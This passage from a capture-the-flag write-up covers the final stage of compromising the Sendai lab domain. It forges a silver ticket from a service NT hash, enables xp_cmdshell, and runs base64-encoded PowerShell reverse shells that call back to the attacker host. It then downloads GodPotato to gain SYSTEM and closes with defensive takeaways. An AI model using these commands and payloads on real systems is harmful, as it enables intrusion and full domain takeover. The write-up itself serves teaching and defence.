$ impacket-ticketer -spn MSSQL/dc.sendai.vl -domain sendai.vl -domain-sid S-1-5-21-3085872742-570972823-736764132 -extra-sid S-1-5-21-3085872742-570972823-736764132-512 -nthash 58655c0b90b2492f84fb46fa78c2d96a sqlsvc
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sendai.vl/sqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving/Updating ticket in sqlsvc.ccache
```

> **Note:** Silver tickets are forged offline from the service NT hash, with no DC involvement. SQL trusts the PAC's SIDs, so injecting the Domain Admins SID (`-512`) makes me a sysadmin.

Using the ticket I connected as Administrator (dbo) and enabled xp_cmdshell.

```
$ KRB5CCNAME=./sqlsvc.ccache proxychains -q impacket-mssqlclient dc.sendai.vl -k -no-pass
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SENDAI\Administrator  dbo@master)> enable_xp_cmdshell
INFO(DC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

I set up a listener for the shell.

```
$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
```

Then ran a PowerShell reverse shell through xp_cmdshell.

```
SQL (SENDAI\Administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA2ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

The reverse shell ran as sqlsvc, and as expected the service account has SeImpersonatePrivilege token.

```
connect to [10.10.14.56] from (UNKNOWN) [10.129.234.66] 50354

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

> **Note:** SeImpersonatePrivilege is the classic "potato" primitive. A service that can impersonate a client token can be tricked into impersonating SYSTEM, which is exactly what GodPotato does.

I uploaded GodPotato to abuse the privilege.

```
PS C:\Windows\system32> cd c:\windows\temp
PS C:\windows\temp> iwr -uri http://10.10.14.56:8000/GodPotato-NET4.exe -o .\gp.exe
```

I started another listener on 9002.

```
$ rlwrap nc -lnvp 9002
listening on [any] 9002 ...
```

GodPotato abused the privilege to run my shell as SYSTEM.

```
PS C:\windows\temp> .\gp.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA2ACIALAA5ADAAMAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

I caught a SYSTEM shell and read the root flag.

```
connect to [10.10.14.56] from (UNKNOWN) [10.129.234.66] 50449

PS C:\windows\temp> whoami
nt authority\system
PS C:\windows\temp> cat c:\users\administrator\desktop\root.txt
1bc1************************91cf
```

## Key Takeaways

**Guest access leaks the entire directory.** The guest account was enabled with a blank password, and that was enough to RID-cycle the full user list and read company shares — everything I needed to start spraying. Disable the guest account and restrict anonymous/guest access to shares so an unauthenticated visitor can't enumerate accounts.

**Expiring a weak password isn't the same as fixing it.** The accounts flagged by the "pen test" were force-expired, but their blank passwords survived, so `STATUS_PASSWORD_MUST_CHANGE` let me set a new one and log in. Reset weak passwords to strong random values instead of relying on the must-change flag, and alert on password changes from unauthenticated sessions.

**gMSA read rights are a delegation path.** A chain of ACLs — support's GenericAll over admsvc, and admsvc's ReadGMSAPassword over mgtsvc$ — let a password-reset foothold turn into a service account. Audit `PrincipalsAllowedToReadPassword` and the group ACLs that feed it, and treat gMSA readers as privileged.

**Credentials don't belong in service definitions or config files.** A service ImagePath exposed clifford.davey's password to anyone who could read the registry, and a `.sqlconfig` on the root of C: handed over the SQL account. Pass secrets through a managed vault or gMSA, never on a command line or in a world-readable file.

**One over-permissive cert template is domain admin.** ca-operators held write access over the `SendaiComputer` template (ESC4), so I rewrote it, enrolled a certificate as Administrator, and pulled the NT hash. Lock down template ACLs to the smallest possible set and monitor certificate requests whose SAN doesn't match the requester.

**Service accounts with SeImpersonate are a short hop to SYSTEM.** Forging a silver ticket with a Domain Admins extra-SID turned the SQL login into a sysadmin, and the resulting shell's SeImpersonatePrivilege gave up SYSTEM through GodPotato. Keep SQL from running as an over-privileged account, and strip SeImpersonate where the service doesn't genuinely need it.
